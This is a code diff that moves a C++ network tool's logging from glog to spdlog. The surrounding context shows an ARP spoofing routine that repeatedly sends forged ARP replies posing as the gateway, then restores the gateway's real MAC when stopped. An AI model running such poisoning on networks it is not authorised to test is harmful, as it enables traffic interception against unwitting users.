@@ -13,13 +13,10 @@ void on_interrupt(int) { end_attack = true; }
 int main(int argc, char *argv[])
 {
     NT_TRY
-    google::InitGoogleLogging(argv[0]);
     gflags::ParseCommandLineFlags(&argc, &argv, true);
-    FLAGS_logtostderr = 1;
-    FLAGS_minloglevel = 0;
 
     if (argc < 2 && !FLAGS_attack) {
-        LOG(ERROR) << "empty ipv4 address, please input ip";
+        spdlog::error("empty ipv4 address, please input ip");
         return -1;
     }
 
@@ -39,19 +36,19 @@ int main(int argc, char *argv[])
         signal(SIGINT, on_interrupt);
         mac gateway_mac;
         if (transport::ip2mac(handle, apt.gateway, gateway_mac)) {
-            LOG(INFO) << "gateway " << apt.gateway.to_str() << " is at " << gateway_mac.to_str();
+            spdlog::info("gateway {} is at {}", apt.gateway.to_str(), gateway_mac.to_str());
         }
-        LOG(INFO) << "forging gateway's mac to " << apt.mac_.to_str() << "...";
+        spdlog::info("forging gateway's mac to {}...", apt.mac_.to_str());
         auto lie = packet::arp(apt.mac_, apt.gateway, apt.mac_, apt.ip, true);
         while (!end_attack) {
             transport::send(handle, lie);
             std::this_thread::sleep_for(1000ms);
         }
-        LOG(INFO) << "attack stopped";
+        spdlog::info("attack stopped");
         if (transport::ip2mac(handle, apt.gateway, gateway_mac, false)) {
             auto truth = packet::arp(gateway_mac, apt.gateway, apt.mac_, apt.ip, true);
             transport::send(handle, truth);
-            LOG(INFO) << "gateway's mac restored to " << gateway_mac.to_str();
+            spdlog::info("gateway's mac restored to {}", gateway_mac.to_str());
         }
     }
     NT_CATCH
